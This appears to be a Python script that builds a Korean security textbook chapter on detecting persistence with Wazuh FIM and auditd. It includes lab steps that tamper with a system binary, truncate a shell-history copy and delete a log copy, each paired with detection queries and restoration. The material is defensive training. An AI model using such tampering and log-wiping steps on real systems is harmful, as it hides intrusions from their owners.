    p('URL은 a4에 있다. 옵션이 몇 개인지에 따라 URL의 위치가 바뀌므로 a1이나 a2만 URL로 검색하면 놓친다. 두 curl 기록의 인자는 같다. 어느 쪽이 sh와 연결되었는지는 같은 부모(ppid)에서 바로 이어 시작된 sh가 있는지로 가린다. 기록은 두 curl을 서로 다른 세션에서 실행했다. 한 셸에서 둘 다 실행하면 세션 번호가 같으므로 부모와 pid 순서를 본다.'),
    q('agent.name: "kt66-host" AND\nrule.groups: "audit_command" AND\ndata.audit.session: "87"',
      '파이프로 실행한 curl과 같은 세션의 명령을 모두 고른다.',
      '87은 자신의 파이프 실행 curl 기록의 data.audit.session으로 바꾼다. data.audit.exe, execve.a0, pid, ppid 열을 추가하고 오래된 순으로 정렬한다.',
      '기록에서는 5건이었다(아래 표). 한 셸에서 실습했다면 내용 확인용 curl과 그 셸의 다른 명령도 함께 나온다.'),
    tab(['exe','a0','pid','ppid','관계'],[
        ['/usr/bin/bash','bash','172868','172867','파이프를 실행한 셸'],
        ['/usr/bin/curl','curl','172869','172868','셸의 자식'],
        ['/usr/bin/dash','sh','172870','172868','셸의 자식(curl과 형제)'],
        ['/usr/bin/id','id','172871','172870','sh의 자식'],
        ['/usr/bin/hostname','hostname','172872','172870','sh의 자식']],[30,18,18,18,43],keep=True),
    p('curl과 sh가 같은 부모(172868)에서 연이어 시작되었다. 파이프 양쪽 명령은 셸이 함께 만드는 형제 프로세스이다. id와 hostname의 부모는 sh(172870)이다. 내려받은 스크립트가 이 두 명령을 실행했다. 기록은 셸을 bash -c로 새로 띄워 실행해 부모 셸도 나왔다. 대화형 셸에서 실행하면 부모는 로그인 때 시작된 셸이므로 이 시간대에는 부모 줄이 없다. sh의 실행 파일은 dash이다. Ubuntu의 sh는 dash를 가리킨다.'))

# ── 9.7 ──────────────────────────────────────────────────────
section('9.7  실행 파일 변경',
    p('실습 27. 공격자는 시스템 프로그램을 자기 코드로 바꿔 관리자가 그 프로그램을 쓸 때 실행되게 할 수 있다. kt66-web의 FIM은 /usr/bin을 realtime으로 감시한다. web의 /usr/bin/yes 끝에 7바이트를 더했다가 되돌려 경보와 패키지 검사 결과를 비교한다. yes는 문자열을 반복 출력하는 coreutils 프로그램이며 실습 중에는 실행하지 않는다. [1]'),
    c('docker exec -it kt66-web /bin/bash',
      'web 관리 셸로 들어간다.',
      'kt66 VM 터미널에서 실행한다. 아래 /usr/bin/yes는 kt66 VM이 아니라 web 컨테이너의 파일이다.',
      '프롬프트가 web 컨테이너로 바뀐다.',HOST),
    c("ls -l /root/book09-yes.before\nstat -c '%s %a %U %n' /usr/bin/yes\nsha256sum /usr/bin/yes\ncp -p /usr/bin/yes /root/book09-yes.before\ncmp /usr/bin/yes /root/book09-yes.before",
      '변경 전 크기·권한·해시를 적고 백업한다.',
      "stat -c의 %s는 바이트 크기, %a는 숫자 권한, %U는 소유자, %n은 경로이다. sha256sum은 파일 내용의 SHA-256 해시를 계산한다.",
      '백업 이름은 No such file or directory이다. 기록에서는 31112 755 root /usr/bin/yes였다. 해시를 사건 노트에 적는다. cmp는 출력이 없다.',WEB),
    c("printf '\\x00BOOK09' >> /usr/bin/yes\nstat -c '%s %a %U %n' /usr/bin/yes\nsha256sum /usr/bin/yes\ndpkg -V coreutils",
      '파일 끝에 7바이트를 더하고 패키지 검사로 확인한다.',
      "printf의 \\x00은 값이 0인 바이트 하나이고 BOOK09가 6바이트이므로 7바이트가 >>로 끝에 붙는다. dpkg -V 패키지는 설치 때 기록한 MD5와 현재 파일을 비교해 다른 파일만 출력한다.",
      '크기가 7 늘고(기록 31119) 해시가 바뀐다. dpkg 출력에 ??5?????? /usr/bin/yes가 생긴다. 5는 내용(MD5)이 다르다는 표시이다. 이전부터 있던 missing 줄은 문서 파일이 이미지에 없다는 뜻이므로 변경 전에도 있었는지 대조한다.',WEB),
    q('agent.name: "web" AND syscheck.path: "/usr/bin/yes"',
      'yes 파일의 변경 경보를 찾는다.',
      'size_before·size_after, sha256_before·sha256_after 열을 추가한다.',
      '550 한 건, size 31112→31119가 나온다. sha256_before가 C09-29의 해시와 같다.'),
    c('cp -p /root/book09-yes.before /usr/bin/yes\ncmp /root/book09-yes.before /usr/bin/yes\nsha256sum /usr/bin/yes\nrm /root/book09-yes.before\nexit',
      '(원상복구) 백업으로 되돌리고 해시를 확인한 뒤 나온다.',
      '복원 후 cmp와 해시로 원래 파일과 같은지 확인하고 백업을 지운다.',
      'cmp 출력이 없고 해시가 C09-29의 값과 같다. kt66 VM 터미널로 돌아온다.',WEB),
    screen('binary-fields','화면 9-6. yes 원상복구 경보의 크기 변화.',85),
    p('복원도 FIM에는 변경이다. Q09-09에 550이 하나 더 생기고 size는 31119→31112이다. 두 경보를 변조 두 번으로 세지 않도록 크기와 해시의 방향을 읽는다. web의 /usr/bin 감시에는 report_changes가 없어 diff가 없다. 실행 파일은 텍스트가 아니므로 내용 대신 해시와 패키지 검사로 판단한다. 패키지 데이터베이스까지 바뀌었다면 dpkg -V도 믿을 수 없으므로 신뢰할 수 있는 이미지와 비교한다.'))

# ── 9.8 ──────────────────────────────────────────────────────
section('9.8  로그 삭제와 비우기',
    p('실습 28. 공격자는 흔적을 줄이려고 로그 파일을 지우거나 비운다. 실제 로그 대신 실습용 사본 두 개를 만든다. /var/log/btmp(실패한 로그인 기록)의 사본과, ccc 홈 아래 디렉터리의 모의 셸 이력 파일이다. 두 위치의 감시 설정 차이로 경보가 어떻게 달라지는지 본다.'),
    c("mkdir -m 700 /home/ccc/book09-history\nprintf '%s\\n' 'echo book09-history' \\\n  > /home/ccc/book09-history/.bash_history\nsudo cp -p /var/log/btmp /var/log/book09-btmp\nsudo sha256sum /var/log/btmp",
      '감시될 실습 파일 두 개를 만들고 원본 btmp의 해시를 적는다.',
      'mkdir -m 700은 소유자만 들어갈 수 있는 디렉터리를 만든다. 이 .bash_history는 직접 쓴 텍스트 파일이며 로그인 셸의 실제 이력이 아니다.',
      '오류 없이 원본 해시가 출력된다. 해시를 사건 노트에 적는다. Discover에서 두 경로의 554가 생긴 것을 확인한 뒤 다음 명령을 실행한다.',CCC),
    c("> /home/ccc/book09-history/.bash_history\nsudo rm /var/log/book09-btmp\nstat -c '%s %n' /home/ccc/book09-history/.bash_history",
      '이력 사본은 비우고, btmp 사본은 지운다.',
      '명령 없이 >만 쓰면 셸이 파일을 쓰기용으로 열면서 길이를 0으로 만든다. rm은 사본만 지운다.',
      '0 /home/ccc/book09-history/.bash_history가 나온다. 원본 /var/log/btmp는 그대로이다.',CCC),
    q('agent.name: "bastion" AND\n(syscheck.path: "/var/log/book09-btmp" OR\nsyscheck.path: "/home/ccc/book09-history/.bash_history")',
      '두 사본의 FIM 경보를 함께 본다.',
      'OR로 두 경로를 묶는다. syscheck.event, size_before, size_after 열을 추가한다.',
      '기록에서는 4건이었다: 두 경로의 554, 이력 사본의 550(size 20→0, diff 1d0 < echo book09-history), btmp 사본의 553.'),
    screen('history-fields','화면 9-7. 이력 사본을 비운 경보의 크기.',85),
    screen('logdelete-fields','화면 9-8. btmp 사본 삭제 경보.',85),
    p('/home/ccc는 속성까지 비교하므로 비우기가 550으로 남았다. /var/log는 check_all="no"이므로 btmp 사본의 554에는 크기가 없고, 삭제만 553으로 남는다. 같은 규칙을 /var/log/auth.log에 적용하면 내용을 비워도 FIM 경보가 없다. 대신 이미 Wazuh로 보낸 로그는 인덱서에 남아 있으므로, 로컬 파일과 인덱서의 기록을 비교하면 비워진 구간을 알 수 있다. 정상적인 로그 회전(logrotate)도 파일 이름을 옮기고 새 파일을 만들며 보관 기간이 지난 파일을 지우므로 554·553 하나로 훼손이라고 판단하지 않고 회전 설정과 시각, 압축된 이전 파일을 대조한다.'),
    c('sudo sha256sum /var/log/btmp\nrm /home/ccc/book09-history/.bash_history\nrmdir /home/ccc/book09-history\nexit',
      '(원상복구) 원본 btmp가 그대로인지 확인하고 이력 사본을 지운 뒤 ccc 셸을 닫는다.',
      'rmdir는 빈 디렉터리만 지운다.',
      '해시가 C09-32의 값과 같고, 지운 파일에 대해 553이 하나 더 생긴다. 공격자 VM으로 돌아온다.',CCC))

# ── 9.9 ──────────────────────────────────────────────────────
section('9.9  변경 기록 교차 분석',
    p('공격 일지를 덮는다. 실습 시간 전체를 Absolute로 지정하고, “어디가 바뀌었나”를 FIM으로, “누가 그때 있었나”를 인증 기록으로, “무엇을 실행했나”를 감사 기록으로 찾는다. 결과 수치는 기록(07:45~08:05)이다.'),
    box('predict','지속성 수단이 남는 위치는 정해져 있다. 파일 이름을 모르는 상태에서 그 위치들의 변경만 고르려면 어떤 조건을 쓸까?'),
    q('rule.groups: "syscheck" AND\n(syscheck.path: /etc/sudoers.d/* OR\nsyscheck.path: /etc/cron.d/* OR\nsyscheck.path: */.ssh/authorized_keys)',
      '이름과 상관없이 권한·반복 실행·재접속 위치의 변경을 고른다.',
      '따옴표 없는 값의 *는 그 자리에 어떤 문자열이든 올 수 있다는 뜻이다. 앞에 *가 오면 경로의 앞부분과 상관없이 끝이 같은 값을 고른다. agent.name 열을 추가한다.',
      '기록의 실습 경보 중 이 조건에 맞는 것은 7건이다: sudoers.d 실습 파일 3, authorized_keys 2, cron.d 실습 파일 2. 모두 bastion이다. 자신의 결과에는 같은 시간대의 다른 변경도 함께 나온다.'),
    p('이 검색을 정기적으로 돌리면 실습 표식 없이도 지속성 위치의 변경을 찾는다. kt66-host도 /etc/cron.d와 /home/ccc/.ssh를 감시하므로 같은 검색에 나온다. [3]'),
    h('경로별 집계'),
    p('6.6의 Dev Tools에서 FIM 경보를 경로별로, 그 안에서 사건 종류별로 센다. 복사용 파일은 examples/rev01/chapter09/D09-01.json이다.'),
    q(DEVTOOLS,
      '시간 범위의 FIM 경보를 경로·사건별로 센다.',
      'filter의 term은 syscheck 그룹, range는 시간 범위이다. 자신의 실습 시각으로 바꾼다. 바깥 terms는 경로별, 안쪽 terms는 그 경로의 added·modified·deleted별 건수이다.',
      'by_path.buckets에 경로마다 doc_count와 by_event가 나온다. 기록의 실습 경로 14건을 정리하면 아래 표와 같다.',qid='D09-01',where='Windows · Indexer management · Dev Tools'),
    tab(['경로(에이전트)','사건','분류'],[
        ['/etc/sudoers.d/99-book09-lab (bastion)','added · modified · deleted','권한'],
        ['/home/ccc/.ssh/authorized_keys (bastion)','modified 2','재접속'],
        ['/etc/cron.d/book09-lab (bastion)','added · deleted','반복 실행'],
        ['/usr/bin/yes (web)','modified 2','실행 파일'],
        ['/home/ccc/book09-history/.bash_history (bastion)','added · modified · deleted','흔적'],
        ['/var/log/book09-btmp (bastion)','added · deleted','흔적']],[62,40,25],keep=True),
    h('시각으로 다른 기록에 넘기기'),
    img(FIG+'rev01-timeline.png','도식 9-3. 기록의 변경 타임라인.',120),
    p('authorized_keys 행을 보자. 경보 timestamp 순서로는 키 제거(07:50:25.985)가 공개 키 로그인(07:50:27.428)보다 먼저이다. 지운 키로 로그인할 수는 없으므로 순서가 맞지 않는다. 5715의 원문 시각(predecoder.timestamp)은 07:50:25로 제거와 같은 초이다. 지운 키로는 로그인할 수 없으므로 로그인이 먼저이다. 경보의 timestamp는 기록이 Manager에 도착해 경보가 된 시각이고, 로그는 에이전트가 파일을 읽어 보내기까지 시간이 걸려 원문 시각보다 늦게 찍힐 수 있다. 서로 다른 기록의 순서를 정할 때는 원문 시각을 함께 본다.'),
    p('bastion의 변경 경보에는 바꾼 계정이 없다. 같은 초의 sudo 기록(Q09-02)에서 요청 계정과 명령을 찾고, 그 계정의 5715에서 출발지와 sshd 번호를 얻는다(8장). kt66-host의 명령은 auid가 로그인 계정을 직접 알려 주고, data.audit.session으로 같은 세션의 다른 명령을 모은다. authorized_keys와 이력 사본처럼 ccc가 sudo 없이 자기 파일을 바꾼 경우에는 sudo 기록도 없다. 그때는 그 시각에 열려 있던 ccc 세션(5715·5501)이 후보이며, 후보가 하나뿐인지까지가 기록으로 말할 수 있는 범위이다. 정리하면 다음 표가 된다.'),
    tab(['변경','언제','어디서 온 세션','근거'],[
        ['sudoers.d 파일','07:49:34~43','bastion ccc SSH','554·550·553 + sudo tee'],
        ['공개 키 등록','07:50:21','기록 없음(sudo 없이 ccc 파일 수정)','550 diff · 열린 ccc 세션'],
        ['공개 키 로그인','07:50:25','새 키 · 192.168.0.108','5715 지문 = diff의 키'],
        ['예약 작업','07:51:42','bastion ccc SSH','554 + sudo tee'],
        ['외부 연결','07:52:26','kt66-host ccc','80792 auid 1000 · 세션'],
        ['내려받아 실행','07:53:20','kt66-host ccc','80792 같은 부모'],
        ['실행 파일 변경','07:53:20','web 관리 셸','550 · auth 기록 없음'],
        ['로그 사본','07:53:26~36','bastion ccc SSH','554·550·553 + sudo cp·rm(btmp 사본)']],[30,25,32,40],keep=True),
    box('blind','web의 yes 변경에는 인증 기록도 sudo 기록도 없다. docker exec로 들어간 root 셸에서 바꿨기 때문이다. 이런 변경은 “언제·무엇”까지만 답할 수 있다. 컨테이너 안의 변경 주체는 kt66 VM에서 docker를 실행한 계정의 감사 기록(auid)으로 좁힌다.'))

# ── 9.10 ─────────────────────────────────────────────────────
section('9.10  정의 확인',
    c('docker exec -it kt66-siem /bin/bash',
      'Manager 컨테이너로 들어간다.',
      'kt66 VM 터미널에서 실행한다.',
      '프롬프트가 kt66-siem 안으로 바뀐다.',HOST),
    c("grep -n -A3 'id=\"55[034]\"' \\\n  /var/ossec/ruleset/rules/0015-ossec_rules.xml\ngrep -n -A4 'id=\"80792\"' \\\n  /var/ossec/ruleset/rules/0365-auditd_rules.xml\ngrep audit-wazuh /var/ossec/etc/lists/audit-keys\nexit",
      'FIM 규칙과 명령 감사 규칙, 감사 키 목록을 확인하고 나온다.',
      '[034]는 0·3·4 중 한 글자이므로 550·553·554를 함께 찾는다. -A3·-A4는 일치한 줄 뒤 3·4줄을 더 출력한다.',
      '550은 decoded_as syscheck_integrity_changed, 553은 syscheck_deleted, 554는 syscheck_new_entry이다. 80792는 if_sid 80700과 list field="audit.key" … check_value="command"이다. audit-keys에는 audit-wazuh-c:command가 있다. 호스트 규칙의 키 audit-wazuh-c가 command로 분류되어 80792가 붙는다.',SIEM),
    p('FIM 경보는 에이전트가 보낸 무결성 이벤트를 Manager가 해석한 것이고, 80792는 audit.log의 원문을 디코더가 나눈 뒤 키 목록으로 분류한 것이다. 둘 다 수준이 3~7로 낮다. 수준은 규칙이 정한 값이며 사건의 결과를 반영하지 않으므로 지속성 위치의 변경은 9.9의 검색처럼 위치로 따로 찾는다. [9][10]'))

# ── 9.11 ─────────────────────────────────────────────────────
section('9.11  결과가 다를 때와 원상복구',
    tab(['증상','확인 순서'],[
        ['FIM 경보가 없다','C09-02의 감시 경로, 에이전트 상태, 시간 범위. 감시 시작 전의 변경은 비교 기준이 없어 남지 않는다.'],
        ['diff가 없다','그 경로의 report_changes, 추가(554) 경보인지 여부, 텍스트 파일인지 여부'],
        ['감사 경보가 없다','C09-05의 kt66-host 상태와 auditctl -l, 실행한 셸의 auid(cat /proc/self/loginuid). sudo -i로 들어간 root 셸도 auid는 유지된다.'],
        ['공개 키 로그인이 안 된다','붙여 넣은 줄의 잘림, authorized_keys 권한(600)과 소유자(ccc)'],
        ['cron 결과가 없다','service cron status, 파일 한 줄의 형식(시간 다섯 칸·계정), 파일 끝 줄바꿈']],[38,89],keep=True),
    h('공격 일지와 조사 기록'),
    p('공격 일지에는 실습 22~28의 변경 일곱 가지와 각각의 원상복구 시각이 있어야 한다. 조사 기록은 examples/rev01/chapter09/investigation.txt 양식으로 9.9의 정리 표를 옮긴다.'),
    h('원상복구'),
    c("ls -l /etc/sudoers.d/99-book09-lab /etc/cron.d/book09-lab \\\n  /tmp/book09-cron-result /var/log/book09-btmp\ncmp /root/book09-ak.before /home/ccc/.ssh/authorized_keys\nrm /root/book09-ak.before\nvisudo -c\nexit",
      'bastion의 실습 경로가 모두 사라졌고 공개 키 목록이 원래와 같은지 확인한 뒤 백업을 지운다.',
      '9.2~9.8의 원상복구 결과를 한 번에 확인한다. cron을 원래 멈춰 있던 상태로 돌렸는지도 service cron status로 확인한다.',
      'ls는 네 경로 모두 No such file or directory, cmp는 출력이 없고, visudo -c는 모두 parsed OK이다. kt66 VM 터미널로 돌아온다.',BAS),
    c('ls -la ~/book09\nrm ~/book09/book09_key ~/book09/book09_key.pub ~/book09/a.sh\ncd ~\nrmdir book09',
      '공격자 VM의 실습 키와 스크립트, 디렉터리를 지운다.',
      '이번에 만든 세 파일만 이름으로 지우고 rmdir로 빈 디렉터리를 지운다.',
      'rmdir가 오류 없이 끝난다. Directory not empty가 나오면 남은 파일을 확인한다. 8000·4444 포트의 대기 창이 모두 닫혔는지 확인한다.',ATT),
    p('kt66-host 에이전트와 auditd는 이후 장에서도 쓰므로 그대로 둔다. Wazuh 경보와 로그는 조사 기록으로 남긴다.'))


# ── 장 끝 ─────────────────────────────────────────────────────
page('9장 정리',
    h('핵심 정리'),
    ul('지속성 수단은 정해진 위치(sudoers.d, authorized_keys, cron.d 등)에 남는다. FIM의 554·550·553을 경로 조건으로 찾고, report_changes가 있으면 diff로 더해진 줄을 읽는다.',
       'FIM은 무엇이 언제 바뀌었는지만 답한다. 바꾼 계정은 같은 초의 sudo 기록과 로그인 기록, 호스트 명령은 감사 기록의 auid·세션·부모 프로세스로 찾는다.',
       '감사 기록의 인자는 실행하려 한 내용이다. 연결이나 실행 결과는 상대 쪽 기록과 출력으로 확인한다.',
       '감시 설정이 기록의 범위를 정한다. bastion의 /var/log는 추가·삭제만 보고, docker exec로 바꾼 컨테이너 파일에는 인증 기록이 없다.'),
    h('확인 문제'),
    ol('authorized_keys의 550이 있다. 이 계정으로 공개 키 로그인이 있었는지 무엇으로 확인하는가?',
       'cron.d에 554가 있다. 그 작업이 실행되었다고 쓸 수 있는가?',
       'nc 실행 경보의 success가 yes이다. 공격자 쪽으로 연결되었다고 쓸 수 있는가?',
       '같은 인자의 curl 경보가 두 건이다. 어느 쪽이 셸로 실행되었는지 어떻게 가리는가?',
       'bastion의 /var/log/auth.log가 비워졌는데 FIM 경보가 없다. 왜이며 어떻게 확인하는가?'),
    h('확인 문제 해설'),
    ol('5715 중 full_log에 Accepted publickey가 있는 기록을 찾고, 그 지문이 diff로 더해진 공개 키의 지문과 같은지 대조한다.',
       '쓸 수 없다. 554는 등록이다. 결과 파일·cron 실행 기록(syslog)·작업이 바꾼 것을 확인해야 실행이라고 쓴다.',
       '쓸 수 없다. success는 nc 프로그램이 시작되었다는 뜻이다. 연결은 상대 쪽 기록이나 네트워크 기록으로 확인한다.',
       '같은 data.audit.session에서 curl과 sh(dash)가 같은 부모 프로세스를 가진 기록을 찾는다. 그 sh의 자식 프로세스가 스크립트가 실행한 명령이다.',
       'bastion의 /var/log 감시는 check_all="no"라서 내용·크기 변경을 비교하지 않는다. 인덱서에 이미 들어온 auth.log 경보·아카이브와 로컬 파일을 비교해 비워진 구간을 찾는다.'),
    h('더 읽을거리'),
    p('Wazuh FIM 설정 문서이다. realtime, report_changes, check_all, nodiff 옵션의 뜻을 9.1의 감시 경로와 대조한다.'),
    link('Wazuh · File integrity monitoring','https://documentation.wazuh.com/current/user-manual/capabilities/file-integrity/index.html'),
    p('MITRE ATT&CK의 지속성(Persistence) 전술 목록이다. 9장의 SSH 공개 키(T1098.004), 예약 작업(T1053.003) 항목의 탐지 방법을 읽는다.'),
    link('MITRE ATT&CK · Persistence','https://attack.mitre.org/tactics/TA0003/'))

section('9장 참고 자료',
    p('결과 값과 화면은 2026년 11월 3일 kt66(기준 커밋 63d4180)의 실행 기록이다. 규칙은 Wazuh 4.10.0과 대조했다.'),
    h('[1] kt66 FIM 설정'),
    link('kt66 · bastion/entrypoint.sh',KT66+'/bastion/entrypoint.sh'),
    link('kt66 · web/wazuh-agent.conf.append',KT66+'/web/wazuh-agent.conf.append'),
    h('[2] Wazuh FIM'),
    link('Wazuh · File integrity monitoring','https://documentation.wazuh.com/current/user-manual/capabilities/file-integrity/index.html'),
    h('[3] kt66 호스트 센서'),
    link('kt66 · deployment/host-sensors.sh',KT66+'/deployment/host-sensors.sh'),
    h('[4] sudoers'),
    link('Ubuntu 22.04 · sudoers(5)','https://manpages.ubuntu.com/manpages/jammy/man5/sudoers.5.html'),
    link('Ubuntu 22.04 · visudo(8)','https://manpages.ubuntu.com/manpages/jammy/man8/visudo.8.html'),
    h('[5] OpenSSH 공개 키'),
    link('Ubuntu 22.04 · sshd(8) AUTHORIZED_KEYS FILE FORMAT','https://manpages.ubuntu.com/manpages/jammy/man8/sshd.8.html'),
    link('Ubuntu 22.04 · ssh-keygen(1)','https://manpages.ubuntu.com/manpages/jammy/man1/ssh-keygen.1.html'),
    h('[6] cron'),
    link('Ubuntu 22.04 · crontab(5)','https://manpages.ubuntu.com/manpages/jammy/man5/crontab.5.html'),
    h('[7] netcat과 auditd'),
    link('Ubuntu 22.04 · nc_openbsd(1)','https://manpages.ubuntu.com/manpages/jammy/man1/nc_openbsd.1.html'),
    link('Ubuntu 22.04 · auditctl(8)','https://manpages.ubuntu.com/manpages/jammy/man8/auditctl.8.html'),
    link('Ubuntu 22.04 · ausearch(8)','https://manpages.ubuntu.com/manpages/jammy/man8/ausearch.8.html'),
    h('[8] curl'),
    link('curl · Manual','https://curl.se/docs/manpage.html'),
    h('[9] Wazuh 규칙'),
    link('0015-ossec_rules.xml',WZ+'/rules/0015-ossec_rules.xml'),
    link('0365-auditd_rules.xml',WZ+'/rules/0365-auditd_rules.xml'),
    h('[10] dpkg'),
    link('Ubuntu 22.04 · dpkg(1)','https://manpages.ubuntu.com/manpages/jammy/man1/dpkg.1.html'),
    h('[11] 강의 자료'),
    link('Module 01 Wazuh 위협탐지 DQL · 실습 22~28','https://docs.google.com/presentation/d/1o0H_2DDHBp8p2HvlSnEPbx6-jdURYzew/edit'))

INVESTIGATION='''지속성·시스템 변경 조사 기록

조사 범위(시각 KST · 에이전트):
지속성 위치의 변경(sudoers.d · authorized_keys · cron.d): 경로 · 사건 · 시각 · diff
그 밖의 변경(실행 파일 · 로그): 경로 · 크기·해시 전후
변경 시각의 세션(sudo data.command · 5715 · sshd 번호 · 원문 시각):
호스트 명령(80792): 실행 파일 · 인자 · auid · 세션 · 부모
지속성 수단이 남았는가(키 · 예약 작업 · 규칙 파일의 현재 상태):
기록이 없는 변경과 이유(감시 범위 · docker exec):
판정과 근거:
대응(보존 · 키·작업·규칙 제거 · 열린 세션 종료 · 감시 보완):
원상복구 확인:
'''
README='''9장 REV01 복사용 입력

C09-01~ : 명령 블록 번호와 같은 파일. 실행 위치는 manifest.json의 where를 따른다.
Q09-01~ : Discover 검색식. queries.json에 인덱스 패턴과 설명이 있다.
D09-01.json : Dev Tools 집계 요청(9.9). 시간 범위를 자신의 실습 시각으로 바꾼다.
a.sh : 9.6에서 만드는 스크립트
investigation.txt : 조사 기록 양식

주소 예시는 kt66 VM 192.168.0.189, 공격자 VM 192.168.0.202이다. 자신의 값으로 바꾼다.
결과 값과 화면은 2026-11-03 실행 기록(kt66 .107, 공격자 .108)이다.
'''

if __name__=='__main__':
    data={'title':'지속성 흔적과 시스템 변경 조사','series':'해킹·침해대응 실무 with Wazuh · 시스템 침투와 SIEM 분석','baseline':COMMIT,'revision':'REV01',
          'comments':'REV01 원고. 결과 값·화면은 2026-11-03 실제 실행 기록. 새로 넣은 확인 절차는 README의 미검증 목록 참조.','pages':pages}
    OUT.mkdir(parents=True,exist_ok=True)
    (OUT/'volume01-chapter09.json').write_text(json.dumps(data,ensure_ascii=False,indent=2)+'\n')
    EX.mkdir(parents=True,exist_ok=True)
    for old in list(EX.glob('C09-*.txt'))+list(EX.glob('Q09-*.txt'))+list(EX.glob('D09-*.json')):old.unlink()
    for b in commands:(EX/(b['id']+'.txt')).write_text(b['text']+'\n')
    for b in queries:(EX/(b['id']+('.json' if b['id'].startswith('D') else '.txt'))).write_text(b['text']+'\n')
    (EX/'manifest.json').write_text(json.dumps(commands,ensure_ascii=False,indent=2)+'\n')
    (EX/'queries.json').write_text(json.dumps(queries,ensure_ascii=False,indent=2)+'\n')
    (EX/'a.sh').write_text(ASH+'\n')
    (EX/'investigation.txt').write_text(INVESTIGATION)
    (EX/'README.txt').write_text(README)
    print(len(pages),'pages',len(commands),'commands',len(queries),'queries')
